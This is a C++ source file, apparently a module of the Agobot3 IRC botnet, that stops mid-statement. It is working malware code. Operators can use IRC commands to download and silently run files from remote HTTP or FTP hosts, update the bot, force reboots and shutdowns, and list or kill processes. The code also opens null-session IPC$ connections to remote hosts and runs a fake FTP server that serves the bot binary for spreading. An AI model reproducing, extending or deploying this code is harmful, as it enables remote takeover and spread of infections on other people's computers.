/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "utility.h"
#include "random.h"
#include "mainctrl.h"
#include "ftplib/ftplib.h"
#ifdef WIN32
#include "3dnow.h"
#endif // WIN32
#include "sockets.h"

int i;

// Format: xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx
// Only alphanumeric characters

void gen_unique_id(char *szString, int iLen)
{	memset(szString, 0, iLen);
	for(int i=0; i<iLen; i++)
	{	int sel=brandom(1, 3);
		switch(sel)
		{
		case 1: // Numeric characters
			szString[i]=(char)brandom(48, 57);
			break;
		case 2: // Uppercase letters
			szString[i]=(char)brandom(65, 90);
			break;
		case 3: // Lowercase letters
			szString[i]=(char)brandom(97, 122);
			break;
		default: // Shouldn't happen
			break; } } }

#pragma warning ( disable : 4035 )
unsigned __int64 cyclecount(void)
{
#if defined (__GNUC__)
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;
#elif defined (WIN32)
	#ifndef BCC32
		_asm {
			_emit 0x0F;
			_emit 0x31;
		}
	#else
		// FIXME: add cyclecount for BCC5
		return 0;
	#endif
#endif
}
#pragma warning ( default : 4035 )

int cpuspeed(void)	// cpu speed function
{	unsigned __int64 startcycle, speed, num, num2;
	do {	startcycle=cyclecount(); Sleep(1000);
			speed=((cyclecount()-startcycle)/100000)/10; }
	while(speed>1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num=speed%100; num2=100;
	if(num<80) num2=75; if(num<71) num2=66; if(num<55) num2=50;
	if(num<38) num2=33; if(num<30) num2=25; if(num<10) num2=0;
	speed=(speed-num)+num2;
	return (int)speed; }

CString RndNick(const char *szPrefix)
{
#ifdef WIN32
#define BUFSIZE 1024
	if(g_pMainCtrl->m_cBot.bot_compnick.bValue) {
		CString sComputerName; char *szComputerName; bool bNameGood=false;
		szComputerName=sComputerName.GetBuffer(1024); init_random();
		unsigned long lStrLen=sComputerName.GetLength();

		if(!GetComputerName(szComputerName, &lStrLen)) strcpy(szComputerName, "phat");
		for(int j=65; j<91; j++) { if(szComputerName[0]==j) { bNameGood=true; } }
		for(int k=97; k<123; k++) { if(szComputerName[0]==k) { bNameGood=true; } }
		if(!bNameGood) strcpy(szComputerName, "phat");
		sComputerName.Append(rand()%10);
		sComputerName.Append(rand()%10);
		sComputerName.Append(rand()%10);
		return sComputerName;
	} else {

if(g_pMainCtrl->m_cBot.bot_randnick.bValue) {

CString randomnick;
srand(GetTickCount());

char a = (rand() % 26) + 'a';
char vAlpha[] = "0123456789abcdefghijklmnopqrstuvwxyz";
char b = vAlpha[ rand() % 36 ];
char c = vAlpha[ rand() % 36 ];
char d = vAlpha[ rand() % 36 ];
char e = vAlpha[ rand() % 36 ];
char f = vAlpha[ rand() % 36 ];
char g = vAlpha[ rand() % 36 ];
{
randomnick.Format("%c%c%c%c%c%c%c", a, b,c,d,e,f,g );

}
return randomnick;
} else { 

#endif // WIN32
		CString sRetVal; srand(GetTickCount());
		int nl=(rand()%3)+4; sRetVal.Assign(szPrefix);
		for(int n=0;n<nl;n++)
		{	CString sTemp; sTemp.Assign(sRetVal);
			sRetVal.Format("%s%c", sTemp.CStr(), (rand()%26)+97); }
		return sRetVal;
#ifdef WIN32
	}
#endif // WIN32
}
}

CString CompleteRandom(void)
{

		CString sRetVal=""; srand(GetTickCount());
		int nl=(rand()%3)+5;
		for(int n=0;n<nl;n++)
		{ sRetVal.Format("%s%c", sRetVal.CStr(), (rand()%26)+97); }
		return sRetVal;
}

bool IsSpace(const char cChar) { if(cChar==' '||cChar=='\t') return true; else return false; }

bool Exist(const char *filename)
{	FILE *fp=fopen(filename, "r"); if(fp) { fclose(fp); return true; } return false; }

bool IsPrivate(const char *ip)
{	if(!ip) return false; if(!strcmp(ip, "")) return false;
	char *tokens[4]; char ipbuf[32]; strncpy(ipbuf, ip, 32); tokens[0]=strtok(ipbuf, "."); if(!tokens[0]) return false;
	for(int i=1;i<4;i++) { tokens[i]=strtok(NULL, "."); if(!tokens[i]) return false; }
	if(!strcmp(tokens[0], "10")) return true;								// Class A private network
	if(!strcmp(tokens[0], "172") && !strcmp(tokens[1], "16")) return true;	// Class B Private network
	if(!strcmp(tokens[0], "192") && !strcmp(tokens[1], "168")) return true;	// Class C private network
	if(!strcmp(tokens[0], "90") && !strcmp(tokens[1], "0")) return true;	// Class Bastart private network :P
	return false; }

bool ScanPort(const char *host, const unsigned short port)
{	CSocket sSocket; if(sSocket.Connect(host, port)) return true; else return false; }

bool Execute(const char *filename, const char *params)
#ifdef WIN32
#ifndef _DEBUG
{	if((int)ShellExecute(0, "open", filename, params, NULL, SW_HIDE)>=32) return true; else return false; }
#else
{	if((int)ShellExecute(0, "open", filename, params, NULL, SW_SHOW)>=32) return true; else return false; }
#endif // _DEBUG
#else // LINUX
{	if(fork()==0)
	{	execl(filename, params);
		exit(0); }
	else return false;
	return true; }
#endif // WIN32

bool CreateProc(char *filename, char *params)
#ifdef WIN32
{	PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo); sinfo.wShowWindow=SW_HIDE;
	if((CreateProcess(NULL, filename, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)>0)==true)
		return true; else return false; }
#else // LINUX
{	if(fork()==0)
	{	execl(filename, params);
		exit(0); }
	else return false;
	return true; }
#endif // WIN32

#ifdef WIN32

bool ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr)
{	DWORD result=0;
	WCHAR Ipc[]=L"\\IPC$";
	TCHAR szServer[280]=TEXT("");
	WCHAR Resource[280]=L"\\\\";
	char tmp[20]="";
	unsigned int err = 0;

	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource,(wchar_t*)szServer);
	wcscat(Resource,Ipc);

	nr->dwType      =RESOURCETYPE_ANY;
	nr->lpLocalName =NULL;
	nr->lpRemoteName=Resource;
	nr->lpProvider  =NULL;
	
	result = WNetAddConnection2W(nr,L"",L"",0);
	if(result==5 || result==1219)
		result = WNetAddConnection2W(nr,NULL,NULL,0);

	if(result==5 || result==1219) return false;

	return true; }

bool CloseNullSession(const char *remote_host)
{	WCHAR Ipc[]=L"\\IPC$";
	TCHAR szServer[280]=TEXT("");
	WCHAR Resource[280]=L"\\\\";
	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource,(wchar_t*)szServer);
	wcscat(Resource,Ipc);
	while(WNetCancelConnection2W(Resource, 0, false)!=NO_ERROR) { Sleep(2000); }
	return true; }

#endif // WIN32

void CDownloader::Init()
{	REGCMD(m_cmdDownload,		"http.download",	"downloads a file from http",				false,	this);
	REGCMD(m_cmdExecute,		"http.execute",		"updates the bot from a http url",			false,	this);
#ifndef _DEBUG
	REGCMD(m_cmdUpdate,			"http.update",		"executes a file from a http url",			false,	this);
#endif // _DEBUG
	REGCMD(m_cmdVisit,			"http.visit",		"visits an url with a specified referrer",	false,	this);
	REGCMD(m_cmdDownloadFtp,	"ftp.download",		"downloads a file from ftp",				false,	this);
	REGCMD(m_cmdExecuteFtp,		"ftp.execute",		"updates the bot from a ftp url",			false,	this);
	REGCMD(m_cmdUpdateFtp,		"ftp.update",		"executes a file from a ftp url",			false,	this); }

bool CDownloader::HandleCommand(CMessage *pMsg)
{	CString sHost, sPath, sUser, sPass, sTarget; url uURL;

	if(!pMsg->sCmd.Compare("http.download"))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sHost.Assign(uURL.sHost); sHost.Append(":"); sHost.Append(uURL.iPort); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(true); }

	if(!pMsg->sCmd.Compare("http.execute"))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sHost.Assign(uURL.sHost); sHost.Append(":"); sHost.Append(uURL.iPort); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=true; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(true); }

	if(!pMsg->sCmd.Compare("http.update"))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sHost.Assign(uURL.sHost); sHost.Append(":"); sHost.Append(uURL.iPort); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		if(!pMsg->sChatString.Token(3, " ").Compare(g_pMainCtrl->m_cBot.bot_id.sValue)) return false;
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=true; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(true); }

	if(!pMsg->sCmd.Compare("ftp.download"))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sUser.Assign(uURL.sUser); sPass.Assign(uURL.sPassword);
		sHost.Assign(uURL.sHost); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sUser.Assign(sUser);
		pDldHlp->m_sPass.Assign(sPass); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=true;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(true); }

	if(!pMsg->sCmd.Compare("ftp.execute"))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sUser.Assign(uURL.sUser); sPass.Assign(uURL.sPassword);
		sHost.Assign(uURL.sHost); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sUser.Assign(sUser);
		pDldHlp->m_sPass.Assign(sPass); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=true; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=true;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(true); }

	if(!pMsg->sCmd.Compare("ftp.update"))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sUser.Assign(uURL.sUser); sPass.Assign(uURL.sPassword);
		sHost.Assign(uURL.sHost); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		if(!pMsg->sChatString.Token(3, " ").Compare(g_pMainCtrl->m_cBot.bot_id.sValue)) return false;
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sUser.Assign(sUser);
		pDldHlp->m_sPass.Assign(sPass); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=true; pDldHlp->m_bFTP=true;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(true); }

	return true; }

void *CDownloadHelper::Run()
{	// If the params are invalid, return
	if(!m_sHost.Compare("") || !m_sTarget.Compare("") || !m_sPath.Compare("")) return NULL;
	if(m_bFTP) if(!m_sUser.Compare("") || !m_sPass.Compare("")) return NULL;
	// Get the port from the host, set it to default if none is specified
	int iPort=0; if(m_sHost.Token(1, ":").Compare("")) iPort=atoi(m_sHost.Token(1, ":").CStr());
	if(iPort==0) if(m_bFTP) iPort=21; else iPort=80;
	// Store only the ip/host in m_sHost
	CString sTemp(m_sHost.Token(0, ":")); m_sHost.Assign(sTemp);
	// Expand environment variables if compiled on Win32
#ifdef WIN32
	char szTemp[MAX_PATH]; ExpandEnvironmentStrings(m_sTarget.CStr(), szTemp, MAX_PATH); m_sTarget.Assign(szTemp);
#endif

	if(m_bFTP)
	{	netbuf *nControl; FtpInit();
		if(!FtpConnect(m_sHost.CStr(), &nControl))
		{	g_pMainCtrl->m_cIRC.SendMsg(m_bSilent, m_bNotice, "Unable to connect to ftp.", m_sReplyTo);
			return NULL; }
		if(!FtpLogin(m_sUser.CStr(), m_sPass.CStr(), nControl))
		{	g_pMainCtrl->m_cIRC.SendMsg(m_bSilent, m_bNotice, "Unable to login to ftp.", m_sReplyTo);
			return NULL; }
		g_pMainCtrl->m_cIRC.SendMsg(m_bSilent, m_bNotice, "Receiving file.", m_sReplyTo);
		if(!FtpGet(m_sTarget.CStr(), m_sPath.CStr(), FTPLIB_IMAGE, nControl))
		{	g_pMainCtrl->m_cIRC.SendMsg(m_bSilent, m_bNotice, "Unable to download from ftp.", m_sReplyTo);
			return NULL; }
		FtpQuit(nControl); }
	else
	{	CSocket sSocket; int d; CString sSendBuf, sReply;

		if(!sSocket.Connect(m_sHost.CStr(), iPort))
		{	g_pMainCtrl->m_cIRC.SendMsg(m_bSilent, m_bNotice, "Unable to connect to http.", m_sReplyTo);
			return NULL; }

		sSendBuf.Format("GET %s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en]\r\nHost: %s:%d\r\n\r\n", m_sPath.CStr(), m_sHost.CStr(), iPort);
		sSocket.Write(sSendBuf.CStr(), sSendBuf.GetLength());
		g_pMainCtrl->m_cIRC.SendMsg(m_bSilent, m_bNotice, "Receiving file.", m_sReplyTo);

		FILE *file=fopen(m_sTarget.CStr(),"wb");
		if(!file) { g_pMainCtrl->m_cIRC.SendMsg(m_bSilent, m_bNotice, "Failed to open file.", m_sReplyTo); return NULL; }
		
		char szBuf[4096];
		while(true)
		{	int i; sSocket.Recv(szBuf, 4096, &i);
			if(i<=0) break; if(i<4096) szBuf[i]=0;
			for(d=0;d<i;d++) if(!strncmp(szBuf+d,"\r\n\r\n",4))
			{	for (d+=4;d<i;d++) fputc(szBuf[d],file);
				goto done_http; } }
done_http:
		while(true)
		{	int i; sSocket.Recv(szBuf, 4096, &i);
			if(i<=0) break; if(i<4096) szBuf[i]=0;
			for(d=0;d<i;d++) fputc(szBuf[d],file); }

		fclose(file);
		sSocket.Disconnect();
	}

	if(!m_bUpdate)
	{	//download isn't an update
		g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo, "download to %s finished.", m_sTarget.CStr());
		
		if(m_bExecute)
		{	Execute(m_sTarget.CStr(), "");
			g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo, "opened %s.", m_sTarget.CStr()); } }
	else
	{	//download is an update
		g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo, "download to %s finished, updating...", m_sTarget.CStr());

		if(CreateProc(m_sTarget.Str(), "-update"))
		{	// successful update, remove and exit
#ifdef WIN32
			if(g_pMainCtrl->m_cBot.as_enabled.bValue)
				g_pMainCtrl->m_cInstaller.RegStartDel(g_pMainCtrl->m_cBot.as_valname.sValue);
			if(g_pMainCtrl->m_cBot.as_service.bValue)
				g_pMainCtrl->m_cInstaller.ServiceDel(g_pMainCtrl->m_cBot.as_service_name.sValue);
#endif
			g_pMainCtrl->m_cInstaller.Uninstall(); g_pMainCtrl->m_bRunning=false; exit(1); }
		else
			g_pMainCtrl->m_cIRC.SendMsg(m_bSilent, m_bNotice, "update failed: error executing file.", m_sReplyTo.Str()); }

	return NULL; }

void CRSLControl::Init() {
	REGCMD(m_cmdReboot,		"rsl.reboot",	"reboots the computer",		false,	this);
	REGCMD(m_cmdShutdown,	"rsl.shutdown",	"shuts the computer down",	false,	this);
	REGCMD(m_cmdLogoff,		"rsl.logoff",	"logs the user off",		false,	this);
}

bool CRSLControl::HandleCommand(CMessage *pMsg) {
	if(!pMsg->sCmd.Compare("rsl.reboot")) {
		g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, \
			"rebooting...");
#ifdef WIN32
		ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);
#else
		system("reboot");
#endif // WIN32
	} else if(!pMsg->sCmd.Compare("rsl.shutdown")) {
		g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, \
			"shutting down...");
#ifdef WIN32
		ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE,0);
#else
		system("shutdown");
#endif // WIN32
	} else if(!pMsg->sCmd.Compare("rsl.logoff")) {
		g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, \
			"logging off...");
#ifdef WIN32
		ExitWindowsEx(EWX_LOGOFF|EWX_FORCE,0);
#else
		system("init 1");
#endif // WIN32
	}

	return false; }

void CProcessControl::Init() {
	REGCMD(m_cmdList,	"pctrl.list",	"lists all processes",	false,	this);
	REGCMD(m_cmdKill,	"pctrl.kill",	"kills a process",		false,	this);
}

bool CProcessControl::HandleCommand(CMessage *pMsg) {
	if(!pMsg->sCmd.Compare("pctrl.list")) {
		list<CString> lProcesses; if(ListProcesses(&lProcesses)) {
			g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "-[ process list ]-", pMsg->sReplyTo.Str());
			list<CString>::iterator ip; int iCount=0;
			for(ip=lProcesses.begin(); ip!=lProcesses.end(); ++ip)
			{	iCount++; g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%d. / \"%s\"", \
					iCount, (*ip).CStr());
				Sleep(1500); }
		}
		return true;
	} else if(!pMsg->sCmd.Compare("pctrl.kill")) {
		if(!pMsg->sChatString.Token(1, " ").Compare("")) return false;
		KillProcess(pMsg->sChatString.Token(1, " ").CStr());
		return true;
	}
	
	return false; }

void *CCmdExecutor::Run()
{	try {
		while(!m_bMsgSet) Sleep(1000);
		g_pMainCtrl->m_cBot.Recv(&m_mMsg, m_bInternal);
#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
#endif
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(2, "CCmdExecutor: Exception in \"%s\".\n", m_mMsg.sChatString.CStr());
#endif // DBGCONSOLE
	}
	return NULL; }

void CCmdExecutor::Set(CMessage *pMsg, bool bInternal)
{	m_pMsg=pMsg; m_mMsg.bNotice=m_pMsg->bNotice; m_mMsg.bSilent=m_pMsg->bSilent;
	m_mMsg.bOutchan=m_pMsg->bOutchan; m_mMsg.sSrc.Assign(m_pMsg->sSrc); 
	m_mMsg.sIdentd.Assign(m_pMsg->sIdentd); m_mMsg.sHost.Assign(m_pMsg->sHost); m_mMsg.sDest.Assign(m_pMsg->sDest);
	m_mMsg.sChatString.Assign(m_pMsg->sChatString); m_bMsgSet=true; m_bInternal=bInternal; }

void *CSendFile::Run()
{	
	try
	{
		CSocket sClientSocket;
		unsigned char fileBuf[4096]; FILE *fp=NULL;
	
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Binding CSendFile to port %d.\n", this, g_pMainCtrl->m_cBot.bot_ftrans_port.iValue);
#endif
		if(!m_sListenSocket.Bind(g_pMainCtrl->m_cBot.bot_ftrans_port.iValue)) return NULL;

#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Listening on port %d.\n", this, g_pMainCtrl->m_cBot.bot_ftrans_port.iValue);
#endif

		while(g_pMainCtrl->m_bRunning)
		{	if(!m_sListenSocket.Accept(sClientSocket)) break;
			// Get the remote ip via getpeername
			sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); sClientSocket.GetPeerName(&sa, &sas);
			// Break if the ip is 0.0.0.0
			if(!(unsigned char)sa.sa_data[2]) continue;
	
			if(g_pMainCtrl->m_cBot.csendfile_show.bValue)
				g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.si_mainchan.sValue.Str(),
					"CSendFile(0x%8.8Xh): Connection from %d.%d.%d.%d accepted.", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
						(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#ifdef DBGCONSOLE
			g_pMainCtrl->m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Connection from %d.%d.%d.%d accepted.\n", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
					(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#endif
			
			int count=4096; CString sFileName; GetFilename(sFileName.GetBuffer(4096), 4096);
			CString sOutFileName(sFileName);
//			sOutFileName.Append(".poly");
//			if(!g_pMainCtrl->m_cPolymorph.DoPolymorph(sFileName.CStr(), sOutFileName.CStr())) {
//				DeleteFile(sOutFileName.CStr());
//				sOutFileName.Assign(sFileName); }
	
			fp=fopen(sOutFileName.CStr(), "rb");
			if(fp) {
#ifdef DBGCONSOLE
				g_pMainCtrl->m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Sending file...\n", this);
#endif
				fseek(fp, 0, SEEK_END); long filesize=ftell(fp); fseek(fp, 0, SEEK_SET);
				char *filesize1=(char*)&filesize; char fsbuf[4]; fsbuf[4]='\0';
				fsbuf[0]=(char)filesize1[0]; fsbuf[1]=(char)filesize1[1];
				fsbuf[2]=(char)filesize1[2]; fsbuf[3]=(char)filesize1[3];
				sClientSocket.Write((char*)fsbuf, sizeof(long));
	
				while(count==4096)
				{	memset(fileBuf, 0, sizeof(fileBuf));
					count=fread(fileBuf, sizeof(char), 4096, fp);
					if(ferror(fp)) break;
					sClientSocket.Write((char*)fileBuf, count); }
	
				if(g_pMainCtrl->m_cBot.csendfile_show.bValue)
					g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.si_mainchan.sValue.Str(),
						"CSendFile(0x%8.8Xh): Transfer to %d.%d.%d.%d finished.", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
							(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#ifdef DBGCONSOLE
				g_pMainCtrl->m_cConsDbg.Log(5, "CSendFile(0x%8.8Xh): Transfer to %d.%d.%d.%d finished.\n", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
						(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#endif
				fclose(fp); }
			sClientSocket.Disconnect();

			Sleep(1000); }
	
		m_sListenSocket.Disconnect();
#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
#endif
	}
	
	return NULL;
}

void *CSendFileFTP::Run()
{
	try
	{
		CSocket sClientSocket;
		unsigned char fileBuf[4096]; FILE *fp=NULL;

#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(5, "CSendFileFTP(0x%8.8Xh): Binding CSendFileFTP to port %d.\n", this, g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);
#endif
		if(!m_sListenSocket.Bind(g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue)) return NULL;

#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(5, "CSendFileFTP(0x%8.8Xh): Listening on port %d.\n", this, g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);
#endif

		while(g_pMainCtrl->m_bRunning)
		{	if(!m_sListenSocket.Accept(sClientSocket)) break;
			// Get the remote ip via getpeername
			sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); sClientSocket.GetPeerName(&sa, &sas);
			// Break if the ip is 0.0.0.0
			if(!(unsigned char)sa.sa_data[2]) continue;

			if(g_pMainCtrl->m_cBot.csendfile_show.bValue)
				g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.si_mainchan.sValue.Str(),
					"CSendFileFTP(0x%8.8Xh): Connection from %d.%d.%d.%d accepted.", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
						(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#ifdef DBGCONSOLE
			g_pMainCtrl->m_cConsDbg.Log(5, "CSendFileFTP(0x%8.8Xh): Connection from %d.%d.%d.%d accepted.\n", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
					(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#endif
			
			int count=4096; CString sFileName; GetFilename(sFileName.GetBuffer(4096), 4096);
			CString sOutFileName(sFileName);
//			sOutFileName.Append(".poly");
//			if(!g_pMainCtrl->m_cPolymorph.DoPolymorph(sFileName.CStr(), sOutFileName.CStr())) {
//				DeleteFile(sOutFileName.CStr());
//				sOutFileName.Assign(sFileName); }

			char szRecvBuf[2048];
				
			char *szWelcome="220 \"Welcome to Bot FTP service.\"\r\n";
			sClientSocket.Write(szWelcome, strlen(szWelcome));

			sClientSocket.RecvLineIRC(szRecvBuf, sizeof(szRecvBuf));
			char *szPassword="331 Please specify the password.\r\n";
			sClientSocket.Write(szPassword, strlen(szPassword));

			sClientSocket.RecvLineIRC(szRecvBuf, sizeof(szRecvBuf));
			char *szLoginOk="230 Login successful. Have fun.\r\n";
			sClientSocket.Write(szLoginOk, strlen(szLoginOk));

			sClientSocket.RecvLineIRC(szRecvBuf, sizeof(szRecvBuf));
			char *szBinary="200 Switching to Binary mode.\r\n";
			sClientSocket.Write(szBinary, strlen(szBinary));

			sClientSocket.RecvLineIRC(szRecvBuf, sizeof(szRecvBuf));
			CString sLine(szRecvBuf); CString sData(sLine.Token(1, " "));
			int iIp1=atoi(sData.Token(0, ",").CStr());
			int iIp2=atoi(sData.Token(1, ",").CStr());
			int iIp3=atoi(sData.Token(2, ",").CStr());
			int iIp4=atoi(sData.Token(3, ",").CStr());
			int iPort1=atoi(sData.Token(4, ",").CStr());
			int iPort2=atoi(sData.Token(5, ",").CStr());
			char szTemp[2]; szTemp[1]=iPort1; szTemp[0]=iPort2;
			unsigned short *sPort=(unsigned short*)szTemp;
			unsigned int iPort=(unsigned int)*sPort;
			char szIp[128]; sprintf(szIp, "%d.%d.%d.%d", iIp1, iIp2, iIp3, iIp4);
			char *szPortOK="200 PORT command successful\r\n";
			sClientSocket.Write(szPortOK, strlen(szPortOK));
				
			sClientSocket.RecvLineIRC(szRecvBuf, sizeof(szRecvBuf));
			char *szBinaryOpen="150 Opening BINARY mode data connection.\r\n";
			sClientSocket.Write(szBinaryOpen, strlen(szBinaryOpen));

			CSocket sSendSocket;
			if(!sSendSocket.Connect(szIp, iPort)) { sClientSocket.Disconnect(); continue; }

			fp=fopen(sOutFileName.CStr(), "rb");
			if(fp) {
#ifdef DBGCONSOLE
				g_pMainCtrl->m_cConsDbg.Log(5, "CSendFileFTP(0x%8.8Xh): Sending file...\n", this);
#endif
				fseek(fp, 0, SEEK_END); long filesize=ftell(fp); fseek(fp, 0, SEEK_SET);

				while(count==4096)
				{	memset(fileBuf, 0, sizeof(fileBuf));
					count=fread(fileBuf, sizeof(char), 4096, fp);
					if(ferror(fp)) break;
					sSendSocket.Write((char*)fileBuf, count); }

				if(g_pMainCtrl->m_cBot.csendfile_show.bValue)
					g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.si_mainchan.sValue.Str(),
